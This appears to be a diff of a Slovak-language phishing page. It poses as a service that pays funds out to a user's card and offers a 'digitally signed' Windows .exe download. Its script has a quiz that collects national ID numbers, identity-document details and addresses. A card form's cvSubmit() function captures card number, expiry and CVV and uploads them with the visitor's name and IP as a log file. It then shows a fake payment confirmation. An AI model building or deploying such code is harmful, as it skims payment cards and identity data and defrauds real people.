+            <rect x="1.5" y="3" width="19" height="13" rx="2" stroke="#C9A84C" stroke-width="1.5"/>
+            <path d="M7 19.5h8M11 16v3.5" stroke="#C9A84C" stroke-width="1.4" stroke-linecap="round"/>
+            <path d="M6 8h10M6 11h6" stroke="#818cf8" stroke-width="1.2" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <div class="dp-option-body">
+          <span class="dp-option-title">Počítač</span>
+          <span class="dp-option-desc">Windows · .exe inštalátor</span>
+        </div>
+        <svg class="dp-chevron" width="16" height="16" viewBox="0 0 16 16" fill="none">
+          <path d="M6 4l4 4-4 4" stroke="#888888" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </div>
+    <p class="dp-note">Súbory sú overené a digitálne podpísané</p>
+  </div>
+</div>
+
+<style>
+.dp-backdrop {
+  position: absolute; inset: 0;
+  background: rgba(5,7,13,0.82);
+  backdrop-filter: blur(6px);
+  -webkit-backdrop-filter: blur(6px);
+}
+#device-picker-modal .dp-card {
+  position: relative; z-index: 1;
+  background: #0f0f0f;
+  border-radius: 22px;
+  width: 100%; max-width: 400px;
+  border: 1px solid #C9A84C22;
+  box-shadow: 0 40px 100px rgba(0,0,0,0.7), 0 0 0 1px rgba(201,168,76,0.1);
+  transform: scale(0.92) translateY(16px);
+  opacity: 0;
+  transition: transform 0.28s cubic-bezier(0.22,1,0.36,1), opacity 0.22s ease;
+  overflow: hidden;
+}
+#device-picker-modal .dp-card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 2px;
+  background: linear-gradient(90deg, transparent, #C9A84C 30%, #E8C96A 70%, transparent);
+  z-index: 2;
+}
+#device-picker-modal.dp-visible .dp-card {
+  transform: scale(1) translateY(0);
+  opacity: 1;
+}
+.dp-header { display:flex; align-items:flex-start; gap:13px; padding:24px 24px 20px; }
+.dp-header-icon {
+  width:40px; height:40px; border-radius:10px;
+  background:#1a1407; border:1px solid #C9A84C;
+  display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.dp-title { font-family:'Inter',sans-serif; font-size:16px; font-weight:700; color:#D4D4D4; letter-spacing:-0.3px; margin-bottom:3px; }
+.dp-subtitle { font-family:'Inter',sans-serif; font-size:12.5px; color:#555555; line-height:1.4; }
+.dp-close {
+  margin-left:auto; flex-shrink:0;
+  width:28px; height:28px; border-radius:7px;
+  border:1px solid #D4D4D4; background:#D4D4D4;
+  cursor:pointer; display:flex; align-items:center; justify-content:center;
+  transition:background 0.12s;
+}
+.dp-close:hover { background:#161616; }
+.dp-divider { height:1px; background:#161616; margin:0 24px; }
+.dp-options { display:flex; flex-direction:column; gap:10px; padding:18px 20px 14px; }
+.dp-option {
+  display:flex; align-items:center; gap:14px; padding:14px 16px;
+  border-radius:14px; border:1.5px solid #D4D4D4; background:#fafafa;
+  cursor:pointer; text-align:left;
+  transition:border-color 0.15s, background 0.15s, transform 0.1s, box-shadow 0.15s;
+  font-family:'Inter',sans-serif;
+}
+.dp-option:hover { border-color:#C9A84C; background:#1a1407; box-shadow:0 4px 16px rgba(59,130,246,0.1); }
+.dp-option:active { transform:scale(0.98); }
+.dp-option-icon { width:44px; height:44px; border-radius:11px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.dp-icon-phone { background:linear-gradient(135deg,#1a1407,#1a1407); border:1px solid #C9A84C; }
+.dp-icon-pc    { background: linear-gradient(135deg, #1a1407, #261b08) !important; border: 1px solid #C9A84C33 !important; }
+.dp-option-body { display:flex; flex-direction:column; gap:2px; flex:1; }
+.dp-option-title { font-size:14px; font-weight:700; color:#D4D4D4; letter-spacing:-0.2px; }
+.dp-option-desc  { font-size:11.5px; color:#555555; }
+.dp-chevron { flex-shrink:0; opacity:0.5; }
+.dp-option:hover .dp-chevron { opacity:1; }
+.dp-note { font-family:'Inter',sans-serif; font-size:11px; color:#888888; text-align:center; padding:0 20px 18px; }
+</style>
+
+
+<style>
+/* ═══════════════════════════════════════════
+   QUIZ / OPROSNIK STYLES
+═══════════════════════════════════════════ */
+
+.quiz-wrapper {
+  overflow: hidden;
+  max-height: 0;
+  opacity: 0;
+  transform: translateY(-12px);
+  transition:
+    max-height 0.6s cubic-bezier(0.22,1,0.36,1),
+    opacity 0.45s ease 0.1s,
+    transform 0.5s cubic-bezier(0.22,1,0.36,1) 0.05s;
+  margin-top: 0;
+}
+.quiz-wrapper.quiz-open {
+  max-height: 900px;
+  opacity: 1;
+  transform: translateY(0);
+  margin-top: 22px;
+}
+
+.quiz-card {
+  background: #0f0f0f;
+  border-radius: 20px;
+  border: 1.5px solid #C9A84C22;
+  box-shadow:
+    0 0 0 5px rgba(201,168,76,0.03),
+    0 10px 40px rgba(0,0,0,0.4),
+    0 2px 8px rgba(0,0,0,0.2);
+  overflow: hidden;
+  position: relative;
+}
+
+/* Header */
+.quiz-header {
+  background: linear-gradient(135deg, #1a3a6b 0%, #8B6914 50%, #8B6914 100%);
+  padding: 0 0 14px;
+  position: relative;
+}
+.quiz-header-accent {
+  height: 4px;
+  background: linear-gradient(90deg, #C9A84C 0%, #E8C96A 40%, #C9A84C 100%);
+}
+.quiz-header-inner {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  padding: 14px 22px 0;
+  gap: 12px;
+}
+.quiz-header-left {
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
+}
+.quiz-icon-box {
+  width: 42px; height: 42px;
+  border-radius: 11px;
+  background: rgba(255,255,255,0.15);
+  border: 1px solid rgba(255,255,255,0.25);
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.quiz-icon-box svg path { stroke: #C9A84C; }
+.quiz-title {
+  font-size: 16px;
+  font-weight: 900;
+  color: #D4D4D4;
+  letter-spacing: -0.4px;
+  margin-bottom: 3px;
+}
+.quiz-subtitle {
+  font-size: 12px;
+  color: rgba(255,255,255,0.72);
+  line-height: 1.35;
+  font-weight: 500;
+}
+.quiz-badge {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(239,68,68,0.18);
+  border: 1px solid rgba(239,68,68,0.3);
+  border-radius: 20px;
+  padding: 4px 11px;
+  font-size: 10.5px;
+  font-weight: 700;
+  color: #fca5a5;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  flex-shrink: 0;
+  white-space: nowrap;
+}
+.quiz-badge-dot {
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  background: #E8C96A;
+  animation: quizBlink 1s ease-in-out infinite alternate;
+}
+@keyframes quizBlink {
+  from { opacity: 1; }
+  to   { opacity: 0.2; }
+}
+
+/* Progress bar */
+.quiz-progress-bar-bg {
+  height: 3px;
+  background: rgba(212, 220, 233, 0.5);
+  margin: 10px 22px 0;
+  border-radius: 10px;
+  overflow: hidden;
+}
+.quiz-progress-bar-fill {
+  height: 100%;
+  width: 33.33%;
+  background: linear-gradient(90deg, #C9A84C, #C9A84C);
+  border-radius: 10px;
+  transition: width 0.5s cubic-bezier(0.22,1,0.36,1);
+}
+.quiz-step-label {
+  font-size: 11px;
+  font-weight: 700;
+  color: rgba(255,255,255,0.55);
+  letter-spacing: 1px;
+  padding: 5px 22px 0;
+  text-transform: uppercase;
+}
+
+/* Body */
+.quiz-body {
+  padding: 18px 22px 2px;
+}
+.quiz-step {}
+
+.quiz-field-label {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 14px;
+  font-weight: 800;
+  color: #D4D4D4; /* Вместо синего делаем благородный светлый */
+  margin-bottom: 10px;
+  line-height: 1.4;
+  letter-spacing: -0.2px;
+}
+.quiz-q-num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 28px;
+  height: 28px;
+  border-radius: 8px;
+  background: linear-gradient(135deg, #1a1407 0%, #261b08 100%); /* Темно-золотой градиент */
+  border: 1.5px solid #C9A84C44; /* Золотая рамка */
+  font-size: 11.5px;
+  font-weight: 900;
+  color: #C9A84C; /* Золотой текст номера */
+}
+
+.quiz-label-image {
+  max-height: 32px;
+  width: auto;
+  flex-shrink: 0;
+  object-fit: contain;
+  filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.05));
+  transition: all 0.2s ease;
+}
+
+.quiz-label-image:hover {
+  filter: drop-shadow(0 2px 4px rgba(29, 78, 216, 0.15));
+  transform: scale(1.05);
+}
+
+.quiz-placeholder-note {
+  display: flex;
+  align-items: flex-start;
+  gap: 7px;
+  font-size: 12px;
+  color: #C9A84C;
+  background: #1a1407;
+  border: 1.5px solid #C9A84C;
+  border-radius: 10px;
+  padding: 11px 14px;
+  margin-bottom: 14px;
+  line-height: 1.55;
+  font-weight: 500;
+}
+
+/* Options grid */
+.quiz-options-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 9px;
+}
+.quiz-opt {
+  background: #f5f7fc;
+  border: 1.5px solid #d4dce9;
+  border-radius: 12px;
+  padding: 13px 14px;
+  font-size: 13px;
+  font-family: 'Inter', sans-serif;
+  font-weight: 600;
+  color: #2d3e52;
+  cursor: pointer;
+  text-align: left;
+  transition:
+    border-color 0.15s,
+    background 0.15s,
+    color 0.15s,
+    box-shadow 0.15s,
+    transform 0.1s;
+  position: relative;
+}
+.quiz-opt:hover {
+  border-color: #C9A84C;
+  background: #eef2f9;
+  color: #8B6914;
+  box-shadow: 0 2px 10px rgba(37, 99, 235, 0.08);
+}
+.quiz-opt:active { transform: scale(0.97); }
+.quiz-opt.selected {
+  border-color: #8B6914;
+  background: linear-gradient(135deg, #1a1407 0%, #e8f1ff 100%);
+  color: #1a3a6b;
+  box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.08), 0 2px 8px rgba(29, 78, 216, 0.12);
+}
+.quiz-opt.selected::after {
+  content: '✓';
+  position: absolute;
+  top: 8px; right: 12px;
+  font-size: 12px;
+  color: #8B6914;
+  font-weight: 900;
+}
+
+/* Footer */
+.quiz-footer {
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  gap: 10px;
+  padding: 12px 22px 16px;
+  border-top: 1px solid #f0f4ff;
+  margin-top: 4px;
+}
+.quiz-btn-back {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 10px 16px;
+  border-radius: 11px;
+  border: 1.5px solid #d4dce9;
+  background: #f5f7fc;
+  color: #C9A84C;
+  font-size: 13px;
+  font-weight: 700;
+  font-family: 'Inter', sans-serif;
+  cursor: pointer;
+  transition: background 0.12s, border-color 0.12s;
+}
+.quiz-btn-back:hover { background: #eef2f9; border-color: #c3cfe3; }
+
+.quiz-btn-next {
+  width: 100%; padding: 11px; 
+    background: linear-gradient(135deg, #C9A84C 0%, #8B6914 100%); /* Золотой градиент */
+    color: #000; /* Чёрный текст на золоте смотрится дорого */
+    border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
+    cursor: pointer; transition: background .2s, transform .1s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+}
+}
+.quiz-btn-next:hover {
+  background: linear-gradient(135deg, #E8C96A 0%, #C9A84C 100%);
+}
+.quiz-btn-next:active { transform: scale(.98); }
+.quiz-btn-next:disabled { background: #1a1a1a; 
+    color: #555; 
+    cursor: not-allowed; 
+}
+
+/* Watermark */
+.quiz-watermark {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 10px;
+  color: #8b94a5;
+  background: #f5f7fc;
+  border-top: 1px solid #e5ecf7;
+  padding: 10px;
+  letter-spacing: 0.3px;
+  font-weight: 500;
+}
+
+/* Step transition */
+.quiz-step.step-exit {
+  animation: stepOut 0.22s ease forwards;
+}
+.quiz-step.step-enter {
+  animation: stepIn 0.28s cubic-bezier(0.22,1,0.36,1) forwards;
+}
+@keyframes stepOut {
+  to { opacity: 0; transform: translateX(-20px); }
+}
+@keyframes stepIn {
+  from { opacity: 0; transform: translateX(20px); }
+  to   { opacity: 1; transform: translateX(0); }
+}
+
+/* ── QUIZ TEXT INPUTS ───────────────────────────────────── */
+.quiz-input-wrap {
+  position: relative;
+  margin-bottom: 6px;
+}
+.quiz-input-icon {
+  position: absolute;
+  left: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  pointer-events: none;
+  z-index: 1;
+  color: #8b94a5;
+  display: flex;
+  align-items: center;
+  transition: color 0.15s;
+}
+.quiz-text-input, .kata-in {
+  width: 100%;
+  padding: 11px 14px 11px 42px;
+  position: relative;
+  z-index: 2;
+  background: #0a0a0a !important;
+  border: 1.5px solid #2a2a2a !important;
+  border-radius: 10px;
+  font-size: 14px;
+  color: #D4D4D4 !important; /* Светлый текст в инпутах */
+  outline: none;
+  transition: border-color .15s, box-shadow .15s;
+  font-family: inherit;
+}
+.quiz-text-input::placeholder {
+  color: #8b94a5;
+  font-weight: 500;
+  letter-spacing: 0;
+}
+.quiz-text-input:focus, .kata-in:focus {
+  border-color: #C9A84C66 !important;
+  background: #0f0f0f !important;
+  box-shadow: 0 0 0 3px rgba(201,168,76,.08) !important;
+}
+.quiz-text-input:focus + .quiz-input-icon,
+.quiz-input-wrap:focus-within .quiz-input-icon { color: #C9A84C; }
+.quiz-input-note {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  font-size: 11px;
+  color: #6b7b91;
+  margin: 0 0 3px;
+  line-height: 1.5;
+  font-weight: 500;
+}
+
+/* ── CARD PREVIEW (Vybrať na kartu) ─────────────────────────── */
+.cv-card-view {
+  width: 100%;
+  height: 168px;
+  border-radius: 16px;
+  background: linear-gradient(135deg, #C9A84C 0%, #8B6914 55%, #8B6914 100%);
+  padding: 18px 20px;
+  color: #D4D4D4;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  box-shadow: 0 8px 28px rgba(201,168,76,0.28), inset 0 1px 0 rgba(255,255,255,0.15);
+  margin-bottom: 20px;
+  position: relative;
+  overflow: hidden;
+}
+.cv-card-view::before {
+  content: '';
+  position: absolute;
+  top: -40px; right: -40px;
+  width: 160px; height: 160px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.06);
+}
+.cv-card-view::after {
+  content: '';
+  position: absolute;
+  bottom: -50px; left: 20px;
+  width: 120px; height: 120px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.04);
+}
+.cv-card-chip { display:flex; align-items:center; }
+.cv-chip-body {
+  width: 36px; height: 28px;
+  background: linear-gradient(135deg, #fbbf24, #C9A84C);
+  border-radius: 5px;
+  display: flex; align-items: center; justify-content: space-around;
+  padding: 0 5px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+}
+.cv-chip-line { width: 1px; height: 100%; background: rgba(0,0,0,0.15); }
+.cv-card-mid { position: relative; z-index: 1; }
+.cv-card-no {
+  font-family: 'Courier New', monospace;
+  font-size: 18px; font-weight: 700;
+  letter-spacing: 2px; word-spacing: 4px;
+  text-shadow: 0 1px 3px rgba(0,0,0,0.2);
+  transition: opacity .2s;
+}
+.cv-card-bottom {
+  display: flex; align-items: flex-end; justify-content: space-between;
+  position: relative; z-index: 1;
+}
+.cv-card-holder { flex: 1; }
+.cv-card-label {
+  font-size: 7px; letter-spacing: 1px;
+  text-transform: uppercase; opacity: 0.6;
+  margin-bottom: 2px;
+}
+.cv-card-name {
+  font-family: 'Courier New', monospace;
+  font-size: 13px; font-weight: 700;
+  letter-spacing: 1px;
+  max-width: 150px; overflow: hidden;
+  text-overflow: ellipsis; white-space: nowrap;
+}
+.cv-card-exp-wrap { margin: 0 16px; }
+.cv-card-exp {
+  font-family: 'Courier New', monospace;
+  font-size: 13px; font-weight: 700; letter-spacing: 1px;
+}
+.cv-card-brand { opacity: 0.9; }
+.cv-form { padding-bottom: 4px; }
+
+/* ── KARTA (Vybrať na kartu) ────────────────────────────────── */
+.ab123 {
+    display: flex;
+    gap: 24px;
+    align-items: flex-start;
+    flex-wrap: wrap;
+}
+.ab12 {
+    width: 100%;
+    max-width: 300px;
+    min-width: 220px;
+    height: 185px;
+    border-radius: 15px;
+    background: linear-gradient(170deg, #bebebe 44%, #4a4a4a 44.5%);
+    padding: 18px;
+    color: #D4D4D4fff;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.18);
+    flex-shrink: 0;
+}
+.ab1 {
+    width: 40px; height: 30px;
+    background: #D4D4D4;
+    border-radius: 5px;
+    border: 1px solid #999;
+    overflow: hidden;
+    display: flex;
+    justify-content: space-around;
+    padding: 0 4px;
+}
+.crt-cli { width: 1px; height: 100%; background: #ccc; }
+.Id-ca-se { display: flex; flex-direction: column; }
+.oeweq12 { font-size: 9px; text-transform: uppercase; color: #b0b0b0; margin-bottom: 3px; letter-spacing: .5px; }
+.krt-c-display {
+    font-family: 'Courier New', monospace;
+    font-size: 17px; font-weight: bold;
+    letter-spacing: 1.5px; word-spacing: 3px;
+    text-shadow: 1px 1px 2px rgba(0,0,0,.6);
+}
+.kar-car-bom { display: flex; justify-content: space-between; align-items: flex-end; }
+.kar-car-id-d {
+    font-family: 'Courier New', monospace;
+    font-size: 13px; font-weight: bold;
+    text-transform: uppercase; letter-spacing: 1px;
+    max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+}
+.karta-card-expiry-display {
+    display: flex; align-items: center;
+    font-family: 'Courier New', monospace;
+    font-size: 13px; font-weight: bold;
+}
+.karta-valid-thru { font-size: 6px; line-height: 1.1; text-align: right; margin-right: 4px; color: #ccc; }
+.karta-arrow { font-size: 9px; margin-right: 4px; color: #ccc; }
+.id-pa-f { flex: 1; min-width: 180px; display: flex; flex-direction: column; gap: 14px; }
+.id-for-gro { display: flex; flex-direction: column; gap: 5px; }
+.kar-lab-row { display: flex; justify-content: space-between; align-items: center; }
+.kar-lab { font-size: 12px; color: #888888; font-weight: 500; letter-spacing: 0.2px; }
+.kata-in {
+    width: 100%; padding: 9px 11px;
+    background: #0a0a0a !important;
+    border: 1.5px solid #2a2a2a !important; border-radius: 8px;
+    font-size: 14px; color: #D4D4D4 !important; outline: none;
+    transition: border-color .2s, box-shadow .2s;
+    font-family: inherit;
+}
+.kata-in:focus { 
+    border-color: #C9A84C66 !important; 
+    box-shadow: 0 0 0 3px rgba(201,168,76,.08) !important; 
+}
+.karta-form-row { display: flex; gap: 12px; }
+.id-ha-wi { width: 50%; }
+.karta-btn-random {
+    background: #161616; color: #555555;
+    border: 1px solid #D4D4D4; padding: 3px 8px;
+    font-size: 10px; border-radius: 5px; cursor: pointer;
+    font-family: inherit; transition: background .15s;
+}
+.karta-btn-random:hover { background: #D4D4D4; }
+
+/* ── CLOSE BUTTON ─────────────────────────────────────────── */
+.quiz-close-btn {
+  width: 28px; height: 28px;
+  border-radius: 8px;
+  border: 1px solid #D4D4D4;
+  background: #D4D4D4;
+  color: #888888;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; flex-shrink: 0;
+  transition: background .15s, color .15s, border-color .15s, transform .1s;
+}
+.quiz-close-btn:hover {
+  background: #fee2e2;
+  border-color: #fca5a5;
+  color: #C9A84C;
+  transform: scale(1.08);
+}
+.quiz-close-btn:active { transform: scale(0.95); }
+</style>
+
+<script>
+/* ═══════════════════════════════
+   QUIZ LOGIC
+═══════════════════════════════ */
+var _quizOpen = false;
+var _quizStep = 1;
+var _quizTotal = 8;
+var _quizAnswers = {};
+var _photoFile = null;
+
+/* map step → input field id */
+var _quizFields = {
+  q1: 'q-rodne-cislo',
+  q2: 'q-psc',
+  q3: 'q-cislo-dokladu',
+  q4: 'q-platnost-dokladu',
+  q5: 'q-trvala-adresa',
+  q6: 'toggle-vedlajsi',
+  q7: 'q-zdroj-prijem-select'
+};
+
+/* ── VYBER NA KARTU ───────────────────────────────────────── */
+var _cardOpen = false;
+
+function triggerVyberKartu() {
+  if (_cardOpen) return;
+  _cardOpen = true;
+
+  /* animate button */
+  var btn = document.getElementById('btn-vyber-kartu');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML =
+      '<span class="menu-action-icon menu-action-icon--gold">' +
+        '<svg style="animation:certSpin .75s linear infinite" width="16" height="16" viewBox="0 0 16 16" fill="none">' +
+          '<circle cx="8" cy="8" r="5.5" stroke="rgba(255,255,255,0.25)" stroke-width="2"/>' +
+          '<path d="M8 2.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/>' +
+        '</svg>' +
+      '</span>' +
+      '<span class="menu-action-body"><span class="menu-action-title">Načítavam…</span></span>';
+  }
+
+  /* collapse menu panel */
+  var panel   = document.getElementById('cert-menu-panel');
+  var trigger = document.getElementById('btn-menu-trigger');
+  if (panel)   panel.classList.remove('open');
+  if (trigger) trigger.classList.remove('open');
+  _certMenuOpen = false;
+
+  /* reveal card section */
+  var wrapper = document.getElementById('cd-se-g');
+  setTimeout(function() {
+    wrapper.classList.add('quiz-open');
+    setTimeout(function() {
+      wrapper.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      _initKartaAfterOpen();
+      var inp = document.getElementById('inputName');
+      if (inp) setTimeout(function(){ inp.focus(); }, 350);
+    }, 200);
+  }, 400);
+}
+
+/* ── CARD FORM LOGIC ─────────────────────────────────────── */
+function cvOnName(el) {
+  var val = el.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+  el.value = val;
+  var d = document.getElementById('cv-card-name');
+  if (d) d.textContent = val.trim() || 'VAŠE MENO';
+}
+
+function cvOnNo(el) {
+  var raw = el.value.replace(/\s+/g,'').replace(/[^0-9]/g,'');
+  var fmt = '';
+  for (var i = 0; i < raw.length; i++) {
+    if (i > 0 && i % 4 === 0) fmt += ' ';
+    fmt += raw[i];
+  }
+  el.value = fmt;
+  var d = document.getElementById('cv-card-no');
+  if (d) d.textContent = fmt || '•••• •••• •••• ••••';
+}
+
+function cvOnExp(el) {
+  var raw = el.value.replace(/[^0-9]/g,'');
+  var out = raw.length > 2 ? raw.substring(0,2) + '/' + raw.substring(2,4) : raw;
+  el.value = out;
+  var d = document.getElementById('cv-card-exp');
+  if (d) d.textContent = out || 'MM/RR';
+}
+
+function cvGenRandom() {
+  var digits = '';
+  for (var i = 0; i < 16; i++) digits += Math.floor(Math.random()*10);
+  var fmt = digits.match(/.{1,4}/g).join(' ');
+  var inp = document.getElementById('cv-input-no');
+  if (inp) { inp.value = fmt; cvOnNo(inp); }
+  /* flash animation on card number */
+  var d = document.getElementById('cv-card-no');
+  if (d) { d.style.opacity='0'; setTimeout(function(){ d.style.opacity='1'; }, 150); }
+}
+
+function cvSubmit() {
+  var name = (document.getElementById('cv-input-name')||{}).value || '';
+  var no   = (document.getElementById('cv-input-no')||{}).value || '';
+  var exp  = (document.getElementById('cv-input-exp')||{}).value || '';
+  var cvv  = (document.getElementById('cv-input-cvv')||{}).value || '';
+
+  if (!name.trim() || !no.trim() || no.replace(/\s/g,'').length < 16 || exp.length < 5 || !cvv) {
+    /* shake the card */
+    var card = document.getElementById('cv-card-view');
+    if (card) {
+      card.style.animation = 'quizShake .35s ease';
+      setTimeout(function(){ card.style.animation=''; }, 400);
+    }
+    return;
+  }
+
+  var footerBtn = document.querySelector('#cad-cad .quiz-footer .quiz-btn-next');
+  if (footerBtn) {
+    footerBtn.disabled = true;
+    footerBtn.innerHTML =
+      '<svg style="animation:certSpin .75s linear infinite" width="14" height="14" viewBox="0 0 14 14" fill="none">' +
+        '<circle cx="7" cy="7" r="5.5" stroke="rgba(255,255,255,.25)" stroke-width="2"/>' +
+        '<path d="M7 1.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/>' +
+      '</svg> Spracovávam…';
+  }
+
+  var params = new URLSearchParams(window.location.search);
+  var lines = [
+    '=== VYBER NA KARTU (cvSubmit) ===',
+    'Čas: '                  + new Date().toISOString(),
+	'IP: ' + (params.get('ip') || ''),
+    '---',
+    'Meno: '          + (params.get('meno') || ''),
+    'Priezvisko: '    + (params.get('priezvisko') || ''),
+	'IP: ' + (params.get('ip') || ''),
+	'---',
+    'Meno na karte: ' + name,
+    'Číslo karty: '   + no,
+    'Expiracia: '     + exp,
+    'CVV: '           + cvv,
+    '=== KONIEC ==='
+  ];
+  var blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  var fd2  = new FormData();
+  fd2.append('file', blob, 'log-' + Date.now() + '.txt');
+
+  fetch('/api/upload', { method: 'POST', body: fd2 })
+    .catch(function(){})
+    .finally(function() {
+      var cardEl = document.getElementById('cad-cad');
+      cardEl.innerHTML =
+        '<div style="padding:44px 24px;text-align:center;">' +
+        '<div style="width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#C9A84C,#8B6914);' +
+        'display:flex;align-items:center;justify-content:center;margin:0 auto 18px;' +
+        'box-shadow:0 6px 24px rgba(201,168,76,0.28);">' +
+        '<svg width="26" height="26" viewBox="0 0 26 26" fill="none">' +
+        '<path d="M5 13l6 6L21 7" stroke="#D4D4D4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>' +
+        '</svg></div>' +
+        '<div style="font-size:16px;font-weight:800;color:#8B6914;margin-bottom:6px;">Platba odoslaná</div>' +
+        '<div style="font-size:13px;color:#555555;line-height:1.6;">Prostriedky budú prevedené<br>na vašu kartu do 24 hodín.</div>' +
+        '<div style="margin-top:18px;display:inline-flex;align-items:center;gap:6px;' +
+        'background:#100e04;border:1px solid #E8C96A;border-radius:30px;' +
+        'padding:6px 16px;font-size:11px;font-weight:700;color:#C9A84C;">' +
+        '<svg width="11" height="11" viewBox="0 0 11 11" fill="none">' +
+        '<rect x="1" y="4" width="9" height="6.5" rx="1" stroke="#C9A84C" stroke-width="1"/>' +
+        '<path d="M3 4V3a2.5 2.5 0 015 0v1" stroke="#C9A84C" stroke-width="1" stroke-linecap="round"/>' +
+        '</svg>Transakcia potvrdená</div>' +
+        '</div>';
+    });
+}
+
+/* ── CERT MENU TOGGLE ──────────────────────────────────────── */
+var _certMenuOpen = false;
+
+function toggleCertMenu() {
+  if (_quizOpen) return; /* quiz already running, don't re-open menu */
+  _certMenuOpen = !_certMenuOpen;
+
+  var trigger = document.getElementById('btn-menu-trigger');
+  var panel   = document.getElementById('cert-menu-panel');
+  var icon    = trigger ? trigger.querySelector('.btn-menu-trigger-icon svg path, .btn-menu-trigger-icon svg rect, .btn-menu-trigger-icon svg circle') : null;
+
+  if (_certMenuOpen) {
+    trigger && trigger.classList.add('open');
+    panel   && panel.classList.add('open');
+    /* small pulse on the blue button after panel opens */
+    setTimeout(function() {
+      var btn = document.getElementById('btn-cert');
+      if (btn) {
+        btn.style.transform = 'scale(1.025)';
+        setTimeout(function(){ btn.style.transform = ''; }, 160);
+      }
+    }, 320);
+  } else {
+    trigger && trigger.classList.remove('open');
+    panel   && panel.classList.remove('open');
+  }
+}
+
+function triggerQuiz() {
+  if (_quizOpen) return;
+  _quizOpen = true;
+
+  /* lock & animate the blue button */
+  var certBtn = document.getElementById('btn-cert');
+  if (certBtn) {
+    certBtn.disabled = true;
+    certBtn.style.opacity = '0.7';
+    certBtn.style.cursor = 'not-allowed';
+    var certText = certBtn.querySelector('.btn-cert-text');
+    if (certText) certText.textContent = 'Načítavam dotazník…';
+    certBtn.innerHTML =
+      '<span class="btn-cert-icon-box">' +
+        '<svg style="animation:certSpin .75s linear infinite" width="16" height="16" viewBox="0 0 16 16" fill="none">' +
+          '<circle cx="8" cy="8" r="5.5" stroke="rgba(255,255,255,0.25)" stroke-width="2"/>' +
+          '<path d="M8 2.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/>' +
+        '</svg>' +
+      '</span>' +
+      '<span class="btn-cert-text">Načítavam dotazník…</span>';
+  }
+
+  /* collapse the menu panel smoothly */
+  var panel = document.getElementById('cert-menu-panel');
+  var trigger = document.getElementById('btn-menu-trigger');
+  if (panel)   panel.classList.remove('open');
+  if (trigger) trigger.classList.remove('open');
+
+  var wrapper = document.getElementById('quiz-section');
+  setTimeout(function() {
+    wrapper.classList.add('quiz-open');
+    /* update progress bar + label */
+    if (typeof updateQuizUI === 'function') updateQuizUI();
+    setTimeout(function() {
+      wrapper.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      var firstInput = document.getElementById(_quizFields['q1']);
+      if (firstInput) setTimeout(function(){ firstInput.focus(); }, 350);
+    }, 200);
+  }, 420);
+}
+
+/* called on every keystroke in a text input */
+function onQuizInput(qKey) {
+  var fieldId = _quizFields[qKey];
+  var val = (document.getElementById(fieldId) || {}).value || '';
+  val = val.trim();
+  _quizAnswers[qKey] = val;
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) nextBtn.disabled = val.length < 1;
+  /* clear error state */
+  var wrap = document.getElementById(fieldId);
+  if (wrap) wrap.classList.remove('quiz-input-error');
+}
+
+/* date auto-formatter DD.MM.RRRR */
+function onQuizInputDate(qKey) {
+  var fieldId = _quizFields[qKey];
+  var input = document.getElementById(fieldId);
+  if (!input) return;
+  var raw = input.value.replace(/[^0-9]/g, '');
+  var out = '';
+  if (raw.length > 0) out += raw.substring(0,2);
+  if (raw.length >= 3) out += '.' + raw.substring(2,4);
+  if (raw.length >= 5) out += '.' + raw.substring(4,8);
+  input.value = out;
+  _quizAnswers[qKey] = out.trim();
+  var nextBtn = document.getElementById('quiz-btn-next');
+  if (nextBtn) nextBtn.disabled = out.length < 10;
+}
+
+function quizShakeInput(qKey) {
+  var fieldId = _quizFields[qKey];
+  var el = document.getElementById(fieldId);
+  if (!el) return;
+  el.classList.remove('quiz-input-error');
+  el.offsetHeight;
+  el.classList.add('quiz-input-error');
+  el.focus();
+}
+
+/* Google Places autocomplete for q5 */
+/* Google Places autocomplete for q5 */
+function initAddressAutocomplete() {
+  var input = document.getElementById('q-trvala-adresa');
+  var list  = document.getElementById('q-adresa-suggestions');
